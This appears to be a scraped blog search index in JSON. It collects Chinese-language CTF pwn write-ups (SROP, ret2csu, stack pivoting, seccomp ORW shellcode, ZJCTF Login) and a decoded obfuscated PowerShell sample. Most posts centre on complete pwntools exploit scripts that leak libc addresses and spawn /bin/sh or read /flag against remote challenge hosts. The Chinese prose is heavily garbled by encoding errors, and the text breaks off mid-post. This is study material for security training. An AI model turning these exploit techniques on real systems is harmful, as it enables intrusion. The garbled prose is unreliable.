çš„å­—ç¬¦ä¸²decoded_bytes &#x3D; base64.b64decode(encoded) # Base64 è§£ç decoded_str &#x3D; decoded_bytes.decode(â€˜utf-16leâ€™) # UTF-16 LE è§£ç â€‹print(decoded_str)â€‹##.(â€˜ieXâ€™)(nEw-objEct SYsteM.Io.StReAMreadEr( ( nEw-objEct SystEM.IO.COMPREssiON.deflaTEStreaM([Io.MemoRysTREAM] [sYsTeM.cOnvErT]::fROMBASE64STring( â€˜bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;â€™), [sYStEM.io.COMPReSSioN.cOmpresSiONmOdE]::DeComPrESS) ),[sysTEm.TEXt.encOdING]::AsciI) ).reaDToEND() å…¸å‹çš„æ··æ·†å‹ç¼© Base64 payload è§£ç è„šæœ¬ import base64import zlibâ€‹# 1. Base64 å­—ç¬¦ä¸²b64_data &#x3D; â€˜bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY&#x2F;UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7&#x2F;EO2lfyizhDyAQ&#x3D;&#x3D;â€™â€‹# 2. Base64 è§£ç compressed_bytes &#x3D; base64.b64decode(b64_data)â€‹# 3. DEFLATE è§£å‹ï¼ˆPowerShell çš„ DeflateStream å¯¹åº” zlib.decompressï¼‰# æ³¨æ„ï¼šDeflateStream ä¸åŒ…å« zlib å¤´ï¼Œæ‰€ä»¥ä½¿ç”¨ -15 window bitsdecompressed_bytes &#x3D; zlib.decompress(compressed_bytes, -15)â€‹# 4. æŒ‰ ASCII ç¼–ç è¯»å–decoded_script &#x3D; decompressed_bytes.decode(â€˜asciiâ€™)â€‹print(decoded_script)â€‹â€‹ æœ€åç»“æœ 123456789echo &quot;Yes, we love VBA!&quot;$input = Read-Host &quot;Password&quot;if ($input -eq &quot;FLAG&#123;w0w_7h3_3mb3dd3d_vb4_1n_w0rd_4u70m471c4lly_3x3cu73d_7h3_p0w3r5h3ll_5cr1p7&#125;&quot;) &#123; Write-Output &quot;Correct!&quot;&#125; else &#123; Write-Output &quot;Incorrect&quot;&#125; c-wgbä½¿ç”¨idaè¿›è¡Œé€†å‘åˆ†æ æ‰¾åˆ°baå‡½æ•°å°±å‘ç°flagç›´æ¥æœ‰äº†","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"SROP","slug":"SROP","date":"2025-09-10T07:25:03.000Z","updated":"2025-09-11T02:56:23.735Z","comments":true,"path":"2025/09/10/SROP/","permalink":"http://example.com/2025/09/10/SROP/","excerpt":"","text":"syscall_leaverootersctf_2019_srop å¯ä»¥çœ‹åˆ°è¿™ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯å­˜åœ¨pop raxçš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥ç”¨SROPæ¥æ³„éœ²åé—¨å‡½æ•° æ€è·¯ç”¨SROPç¬¬ä¸€æ¬¡è¯»å…¥æ‰§è¡Œreadå‡½æ•°ï¼Œç¬¬äºŒæ¬¡å‘è¿™ä¸ªreadå‡½æ•°è¯»å…¥&#x2F;bin&#x2F;shï¼Œå¹¶è®©å‡½æ•°é€šè¿‡frameå»æ‰§è¡Œå®ƒ æ³¨æ„ï¼Œåœ¨ç¬¬ä¸€æ¬¡çš„rbpæ§åˆ¶ï¼Œä»–æ˜¯é€šè¿‡leave_retè·³è½¬çš„ï¼Œè¿™ä¸ªrbpæ˜¯è¦æ‰§è¡Œå‡½æ•°çš„å‰ä¸€ä¸ªä½ç½®ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒä¸ªpayloadæ„é€ çš„æ—¶å€™åŠ ä¸Šâ€œ&#x2F;bin&#x2F;sh\\x00â€ä¸€å…±è¦å¡«å……0x38ä¸ªå­—èŠ‚æ‰åˆ°è¾¾æˆ‘ä»¬æ„é€ çš„readå‡½æ•°æ‰§è¡Œç»“æŸä¹‹åä¼šç»§ç»­æ‰§è¡Œçš„ä½ç½® è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./rootersctf_2019_srop&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port =27430#libc=ELF(&quot;&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x000000000401035&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)rax_sys_kea_ret=0x401032bss=0x402000syscall=0x401033frame=SigreturnFrame()frame.rax=0frame.rdi=0frame.rsi=bssframe.rdx=0x400frame.rip=syscallframe.rbp=bss+0x30payload=b&quot;a&quot;*0x88+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)sa(b&quot;Hey, can i get some feedback for the CTF?&quot;,payload)frame=SigreturnFrame()frame.rax=59frame.rdi=bssframe.rsi=0frame.rdx=0frame.rip=syscallpay=b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*0x30+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)p.sendline(pay)p.interactive() call_syscallé¢˜ç›® æ€è·¯å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†pieä¿æŠ¤ï¼Œä½†ç¨‹åºä¼šè¾“å‡ºputsçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡putsçš„åœ°å€å»æ³„éœ²libcåŸºåœ°å€ï¼Œä½†æ˜¯canaryä¿æŠ¤é™åˆ¶äº†æ‰§è¡Œçš„èŒƒå›´ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡syscall(15)å»ä½¿ç”¨SigreturnFrameï¼Œè®¾è®¡å¯„å­˜å™¨è®©å‡½æ•°è¾“å…¥&#x2F;flaghe orwçš„æ”»å‡»ï¼Œæœ€åæ§åˆ¶rspå»æ‰§è¡Œè¿™ä¸ªorw è¿™é‡Œä¸æ˜¯syscallï¼Œè€Œæ˜¯è°ƒç”¨syscallï¼Œè°ƒç”¨ä¼špush rspï¼Œä¼šå¯¼è‡´ä¸æ»¡16å­—èŠ‚ï¼Œæ‰€ä»¥èˆå»æˆ‘ä»¬æ„é€ çš„frameçš„å‰8ä¸ªå­—èŠ‚ è¯¦è§£å¯ä»¥çœ‹å¸ˆå‚…ä¸ä¼šä¿®ç”µè„‘çš„å¸ˆå‚… è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./babypwn&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port = 26643libc = ELF(&quot;libc-2.23.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b* printf&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)p.recvuntil(b&quot;0x&quot;)puts = int(p.recv(12), 16)print(b&quot;puts==================&quot;+hex(puts).encode())libc_base= puts - libc.symbols[&quot;puts&quot;]open_addr = libc_base + libc.symbols[&#x27;open&#x27;] read_addr = libc_base + libc.symbols[&#x27;read&#x27;]write_addr = libc_base + libc.symbols[&#x27;write&#x27;]bss = libc_base + 0x00000000003c6000rdi = libc_base + 0x21102 rsi = libc_base + 0x202e8 rdx = libc_base + 0x1b92 frame = SigreturnFrame()frame.rdi = 0frame.rsi = bssframe.rdx = 0x200frame.rip = read_addrframe.rsp = bss+8pay = bytes(frame)[8:]p.sendlineafter(b&#x27;Please input magic message: &#x27;, pay)payload = b&quot;/flag\\x00\\x00\\x00&quot;+p64(rdi) + p64(bss) + p64(rsi) + p64(0) + p64(open_addr)payload += p64(rdi) + p64(3) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(read_addr)payload += p64(rdi) + p64(1) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(write_addr)p.sendline(payload)p.interactive()","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"}]},{"title":"odd_canary","slug":"odd-canary","date":"2025-09-09T12:09:33.000Z","updated":"2025-09-09T12:09:33.907Z","comments":true,"path":"2025/09/09/odd-canary/","permalink":"http://example.com/2025/09/09/odd-canary/","excerpt":"","text":"","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"[HNCTF 2022 WEEK2]ret2csu","slug":"HNCTF-2022-WEEK2-ret2csu","date":"2025-09-08T10:28:12.000Z","updated":"2025-09-09T05:24:30.413Z","comments":true,"path":"2025/09/08/HNCTF-2022-WEEK2-ret2csu/","permalink":"http://example.com/2025/09/08/HNCTF-2022-WEEK2-ret2csu/","excerpt":"","text":"é¢˜ç›® åˆ†æ å¯ä»¥çœ‹åˆ°æ²¡æœ‰systemå‡½æ•°ï¼Œè€Œä¸”åªèƒ½é€šè¿‡writeå»æ³„éœ²ï¼Œwriteæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä½†æ˜¯popæŒ‡ä»¤ä¸å¤Ÿ æ‰€ä»¥è¦ç”¨csu æ•´ç†ä¸€ä¸‹æ€è·¯ å…ˆé€šè¿‡popé‚£ä¸€å—æ“ä½œæŠŠæˆ‘ä»¬è¦çš„å€¼æ”¾å…¥å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œç„¶åå†è°ƒç”¨movå‡½æ•°å»è®¾ç½®æˆ‘ä»¬éœ€è¦çš„å¯„å­˜å™¨ï¼Œæ³¨æ„add rspè·³è¿‡ä¸€ä¸ªä½ç½®ï¼Œä»¥åŠ6ä¸ªpopæŒ‡ä»¤ä¸€å…±å¤„ç†äº†56ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦å¡«è¡¥ä¸Š ä¹Ÿå°±æ˜¯è¯´åœ¨æ‰§è¡Œå®Œä¸€æ¬¡popå’Œmovæ“ä½œä¹‹åä¼šå†æ¬¡è¿›å…¥popï¼Œè¦å¡«å……è¶³å¤Ÿçš„å­—èŠ‚rspåˆ°è¾¾æˆ‘ä»¬çš„retåœ°å€å¤„ç„¶åæ”¹å˜è¿”å›åœ°å€ æ‰€ä»¥ è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./ret2csu&quot;remote_host = &quot;node5.anna.nssctf.cn&quot;remote_port = 20627libc=ELF(&quot;./libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x04012D7&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main= 0x4011DCrdi = 0x4012b3ret= 0x40101apop6=0x4012AAmov=0x401290p.recvuntil(b&quot;Input:\\n&quot;)payload = b&#x27;a&#x27;*0x108 + p64(pop6)payload += p64(0) + p64(1) + p64(1)payload += p64(write_got) + p64(8) + p64(write_got)payload += p64(mov) +b&quot;a&quot;*56+ p64(main)p.sendline(payload)p.recvuntil(b&quot;Ok.\\n&quot;)write= u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;write:&quot;,hex(write))libc_base = write- libc.symbols[&#x27;write&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload2 = b&#x27;a&#x27;*0X108+ p64(ret) + p64(rdi) + p64(bin_sh_addr) + p64(system_addr)delimiter = &#x27;Input:\\n&#x27;p.sendlineafter(delimiter, payload2)p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"}]},{"title":"[NSSRound#14 Basic]rbp","slug":"NSSRound-14-Basic-rbp","date":"2025-09-01T13:54:30.000Z","updated":"2025-09-03T10:56:34.158Z","comments":true,"path":"2025/09/01/NSSRound-14-Basic-rbp/","permalink":"http://example.com/2025/09/01/NSSRound-14-Basic-rbp/","excerpt":"","text":"é¢˜ç›® å¯ä»¥çœ‹åˆ°æ˜¯æ ˆè¿ç§»ï¼Œè€Œä¸”æ˜¯åªæœ‰readè¾“å…¥çš„ç±»å‹ï¼Œè€ƒè™‘leaç±»å‹ å› ä¸ºreadè¯»å…¥æ•°æ®ä¹‹åå“ˆæœ‰ä¸ªputsè¾“å‡ºï¼Œä¸ºäº†é˜²æ­¢å‘é€æ•°æ®çš„æ—¶æœºä¸å¯¹ï¼Œæˆ‘ä»¬æ§åˆ¶leaåœ¨è¾“å‡ºtry itä¹‹å‰ï¼Œä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ åˆçœ‹åˆ°æ²™ç›’ï¼Œåœ¨ç¨‹åºä¸­éªŒè¯ å…è®¸æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ï¼Œ å”¯ç‹¬ç¦æ­¢ execveï¼ˆä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥ execve(&quot;/bin/sh&quot;)ï¼‰ æ‰€ä»¥ç”¨æ²™ç›’ open, read,write è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#io=process(&#x27;./rbp&#x27;)io=remote(&quot;node4.anna.nssctf.cn&quot;,28726)#gdb.attach(io, &quot;b*0x4012BF&quot;)elf=ELF(&#x27;./rbp&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)bss=0x404800leave=p64(0x4012BF)payload=b&#x27;a&#x27;*0x210+p64(bss)+p64(0x40127F)io.sendafter(b&quot;try it\\n&quot;,payload)io.recvline()rdi=p64(0x401353)rbp=0X40126Elea=0x401286# payload=p64(bss+0x600)+rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(lea)# payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)# payload+=p64(bss-0x210)+leavepayload=rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(rbp)+p64(bss+0x600)+p64(lea)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss-0x210-8)+leaveio.sendafter(b&quot;try it\\n&quot;,payload)io.recvline()puts_add=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(b&quot;puts===========================&quot;+hex(puts_add).encode())offset=puts_add-libc.sym[&#x27;puts&#x27;] success(&#x27;offset: &#x27;+hex(offset)) openn=offset+libc.sym[&#x27;open&#x27;]read=offset+libc.sym[&#x27;read&#x27;]write=offset+libc.sym[&#x27;write&#x27;] rsi=p64(offset+0x2601f)rdx=p64(offset+0x142c92) payload=b&#x27;/flag\\x00\\x00\\x00&#x27;payload+=rdi+p64(bss+0x600-0x210)+rsi+p64(0)+rdx+p64(0)+p64(openn)payload+=rdi+p64(3)+rsi+p64(bss)+rdx+p64(0x50)+p64(read)payload+=rdi+p64(1)+rsi+p64(bss)+rdx+p64(0x50)+p64(write)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss+0x600-0x210)+leaveio.sendafter(b&quot;try it\\n&quot;,payload) io.interactive() æ”¶è·rbpæ§åˆ¶123payload=p64(bss+0x600)+rdi+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(lea)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss-0x210)+leave åœ¨payloadæœ€å¼€å§‹æ§åˆ¶rbpï¼Œè®©å‡½æ•°è·³è½¬è¿‡å»ä¹‹åç¬¬ä¸€ä¸ªpopä¸ºrbp,æœ€åç›´æ¥leaè·³è½¬æ‰§è¡Œraedå‡½æ•° orwçš„ç³»ç»Ÿè°ƒç”¨1234567payload=b&#x27;/flag\\x00\\x00\\x00&#x27;payload+=rdi+p64(bss+0x600-0x210)+rsi+p64(0)+rdx+p64(0)+p64(openn)payload+=rdi+p64(3)+rsi+p64(bss)+rdx+p64(0x50)+p64(read)payload+=rdi+p64(1)+rsi+p64(bss)+rdx+p64(0x50)+p64(write)payload=payload.ljust(0x210,b&#x27;\\x00&#x27;)payload+=p64(bss+0x600-0x210)+leaveio.sendafter(b&quot;try it\\n&quot;,payload) é€šè¿‡å¯„å­˜å™¨æ§åˆ¶å‡½æ•°","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"æ ˆè¿ç§»","slug":"æ ˆè¿ç§»","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"simple_shellcode","slug":"simple-shellcode","date":"2025-08-29T12:57:56.000Z","updated":"2025-09-03T10:57:00.137Z","comments":true,"path":"2025/08/29/simple-shellcode/","permalink":"http://example.com/2025/08/29/simple-shellcode/","excerpt":"","text":"é¢˜ç›® MEMORY[0xCAFE0000]: è¿™éƒ¨åˆ†è¡¨ç¤ºç¨‹åºæ­£åœ¨è®¿é—®å†…å­˜åœ°å€ 0xCAFE0000 å¤„çš„å†…å®¹ã€‚ (): åœ¨ C&#x2F;C++ ç­‰ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œåœ†æ‹¬å· () é€šå¸¸è¡¨ç¤ºå‡½æ•°è°ƒç”¨ã€‚ åˆèµ·æ¥ï¼Œè¿™å¥è¯çš„æ„æ€å°±æ˜¯ï¼šå°†å†…å­˜åœ°å€ 0xCAFE0000 ä¸­çš„å†…å®¹è§†ä¸ºä¸€ä¸ªå‡½æ•°ï¼ˆæˆ–ä¸€æ®µå¯æ‰§è¡Œä»£ç ï¼‰ï¼Œå¹¶ç«‹å³æ‰§è¡Œå®ƒã€‚ è¯¥æ²™ç®±ä¸»è¦é€šè¿‡ seccomp è¿‡æ»¤å™¨ç¦ç”¨äº†ä¸æ‰§è¡Œæ–°ç¨‹åºå’Œæå‡æƒé™ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯ execve å’Œ execveat åœ¨mainå‡½æ•°å¯ä»¥çœ‹åˆ°åªèƒ½è¾“å…¥0x10ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªé•¿åº¦æ— æ³•æ„å»ºshellcode æ‰€ä»¥è°ƒç”¨ä¸€ä¸ªé•¿åº¦è¶³å¤Ÿçš„readå‡½æ•°è¯»å…¥(12ä¸ªå­—èŠ‚) readçš„ä¸‰ä¸ªå‚æ•°ã€‚rdiæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œrsiæ˜¯å†™å…¥ä½ç½®ï¼Œrdxæ˜¯å†™å…¥é•¿åº¦ rdxæ‰§è¡Œreadçš„æ—¶å€™æ˜¯0x10 ä½†æ˜¯å½“ä»–è¿è¡Œåˆ°è°ƒç”¨bufçš„æ—¶å€™ï¼Œrdxçš„æ•°å€¼æ˜¯bufçš„åœ°å€ 1234xor rdi, rdiï¼š1 å­—èŠ‚ (\\x48\\x31\\xff)mov rsi, rdxï¼š3 å­—èŠ‚ (\\x48\\x89\\xd6)add rsi, 0xcï¼š3 å­—èŠ‚ (\\x48\\x83\\xc6\\x0c)syscallï¼š2 å­—èŠ‚ (\\x0f\\x05) ç„¶åå°±å¯ä»¥å¯¹flagæ–‡ä»¶è¿›è¡Œæ“ä½œ è„šæœ¬ 123456789101112131415161718192021222324from pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;, 21185)io = process(&quot;./vuln&quot;)elf = ELF(&quot;./vuln&quot;)gdb.attach(io)io.recvuntil(b&quot;shellcode:\\n&quot;)read_code = &quot;&quot;&quot;xor rdi, rdimov rsi, rdxadd rsi, 0xcsyscall&quot;&quot;&quot;io.send(asm(read_code))shellcode = shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(3, 0xCAFE0000 + 0x100, 0x100)shellcode += shellcraft.write(1, 0xCAFE0000 + 0x100, 0x100)io.sendline(asm(shellcode))io.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"[ZJCTF 2019]Login","slug":"ZJCTF-2019-Login","date":"2025-08-26T12:08:05.000Z","updated":"2025-09-03T10:57:06.053Z","comments":true,"path":"2025/08/26/ZJCTF-2019-Login/","permalink":"http://example.com/2025/08/26/ZJCTF-2019-Login/","excerpt":"","text":"é¢˜ç›® å‘ç°ä»£ç æœ‰ç‚¹ä¸å®¹æ˜“åˆ†æï¼Œä½†æ˜¯é¢˜ç›®ä¸­å­˜åœ¨ç›´æ¥çš„åé—¨å‡½æ•° æ‰€ä»¥é¢˜ç›®åº”è¯¥ä¸éš¾ åœ¨checkå‡½æ•°ä¸­ çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„å‚æ•°è¢«æ‰§è¡Œäº† æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªå‚æ•°ç›´æ¥æ›¿æ¢ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨rdiä¸­ï¼‰ å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯åœ¨mainå‡½æ•°ä¸­è¢«è°ƒç”¨çš„ æˆ‘ä»¬å»mainå‡½æ•°ä¸­æ‰¾åˆ°rdiçš„èµ‹å€¼ lea rax, [rbp+var_130] è¿™æ¡æŒ‡ä»¤çš„æ„æ€å°±æ˜¯ï¼š**è®¡ç®— [rbp+var_130] è¿™ä¸ªå†…å­˜åœ°å€ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€æœ¬èº«çš„å€¼èµ‹ç»™ rax å¯„å­˜å™¨ã€‚**ç¬¦åˆæˆ‘ä»¬åé¢çœ‹åˆ°çš„a1æŒ‡é’ˆçš„æƒ…å†µ å›¾ä¸­å¯ä»¥çœ‹åˆ°rdiçš„å€¼åº”è¯¥æ˜¯[rbp+var_130] ä¸”åœ¨password_checkerä¹‹åæŠŠ[rbp+var_130]çš„å€¼èµ‹ç»™rax æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»password_checkeræŸ¥çœ‹å…¶ä½ç½®ï¼Œç›®æ ‡å°±æ˜¯æ‰¾åˆ°å®ƒçš„ç›¸å¯¹ä½ç½® çœ‹åˆ°è·ç¦»retæ˜¯0x18 mainæ¥ä¸‹æ¥ä¼šè°ƒç”¨read_passwordå‡½æ•°ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯mainè°ƒç”¨çš„ï¼Œå¯ä»¥æ ¹æ®å…¶ç›¸å½“äºretçš„ä½ç½®å»åˆ¤æ–­å…¶å®é™…ä½ç½®ï¼‰ ä¼šæŠŠæ ˆæ¸…ç©ºï¼Œç„¶åå»ºå®ƒè‡ªå·±çš„çš„æ ˆç©ºé—´ å¯ä»¥çœ‹åˆ°ä»è¯»å…¥ä½ç½®såˆ°æˆ‘ä»¬æ‰§è¡Œçš„å‚æ•°ä½ç½®åç§»æ˜¯0x48 è„šæœ¬ 12345678910111213141516171819from pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p=process(&quot;./login&quot;)elf=ELF(&quot;./login&quot;)#gdb.attach(p,&quot;b*0x400B68&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29403)p.recvuntil(b&quot;username:&quot;)p.sendline(b&quot;admin&quot;)#p.recvuntil(b&quot;password:&quot;)pay=b&quot;2jctf_pa5sw0rd&quot;pay=pay.ljust(0x48,b&quot;\\x00&quot;)pay+=p64(0x400E88)p.sendline(pay)p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"raxæ›¿ä»£","slug":"raxæ›¿ä»£","permalink":"http://example.com/tags/rax%E6%9B%BF%E4%BB%A3/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"heap_base","slug":"heap","date":"2025-08-24T10:07:08.000Z","updated":"2025-10-21T10:50:22.376Z","comments":true,"path":"2025/08/24/heap/","permalink":"http://example.com/2025/08/24/heap/","excerpt":"","text":"å †ç®¡ç†å™¨ptmallocç¨‹åºè¿è¡Œæ—¶å †æä¾›åŠ¨æ€åˆ†å¸ƒçš„å†…å­˜ï¼Œä»è€Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ï¼Œå †ç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿ï¼Œè¿™å’Œæ ˆæ˜¯ç›¸åçš„ï¼ˆæ ˆæ˜¯ç”±é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘ç”Ÿé•¿ï¼‰ æ¯ä¸ªç³»ç»Ÿéƒ½æœ‰è‡ªå·±çš„å †ç®¡ç†å™¨ï¼Œä¸åŒå¹³å°çš„å †ç®¡ç†å™¨æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚Windowsã€Linuxã€Macçš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œç”¨æˆ·è¯·æ±‚å †å—å’Œé‡Šæ”¾å †å—çš„æµç¨‹ä¹Ÿä¸ä¸€æ ·ã€‚ å †åˆ©ç”¨å°±æ˜¯é’ˆå¯¹å †ç®¡ç†å™¨çš„ä¸€ç§åˆ©ç”¨æ€è·¯ã€‚å®ƒå°±åƒæ˜¯ä¸­ä»‹ï¼Œä¸ºäº†é¿å…ç³»ç»Ÿä¸ç”¨æˆ·é¢‘ç¹äº¤äº’ï¼ˆå› ä¸ºå’Œæ“ä½œç³»ç»Ÿäº¤äº’éå¸¸è€—æ—¶ï¼‰ï¼Œå°±æœ‰äº†å †ç®¡ç†å™¨ã€‚å®é™…ä¸Šï¼Œç”¨æˆ·å¹³æ—¶ç”³è¯·ï¼ˆmallocï¼‰å’Œé‡Šæ”¾ï¼ˆfreeï¼‰å †å—çš„æ—¶å€™ï¼Œæ˜¯å’Œå †ç®¡ç†å™¨ç›´æ¥æ¥è§¦çš„ã€‚ ptmallocåŸºæœ¬åŠŸèƒ½ä¸»è¦è´Ÿè´£å®Œæˆç”¨æˆ·çš„ä¸¤ä¸ªéœ€æ±‚ï¼šmallocï¼ˆç”³è¯·å †å—ï¼‰å’Œfreeï¼ˆé‡Šæ”¾å †å—ï¼‰ åœ¨ptmallocå †ç®¡ç†å™¨ä¸­ï¼Œå†…æ ¸ä¸€èˆ¬ä¼šé¢„å…ˆåˆ†é…ä¸€å—å¾ˆå¤§çš„è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ï¼Œåªæœ‰å½“å‡ºç°å †ç©ºé—´ä¸è¶³çš„æƒ…å†µæ—¶ï¼Œptmallocå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·å†…å­˜ é‡Šæ”¾å †å—çš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·ï¼Œptmallocå †ç®¡ç†å™¨éœ€è¦ç®¡ç†ç”¨æˆ·é‡Šæ”¾çš„å †å—ï¼Œä¼šé€šè¿‡ä¸€ç³»åˆ—çš„binè¿›è¡Œç®¡ç†ã€‚binåœ¨ptmallocä¸­ç”¨æ¥ä¿å­˜æ²¡æœ‰ä½¿ç”¨çš„chunkï¼ˆé‡Šæ”¾ä¹‹åçš„chunkï¼‰ã€‚æ 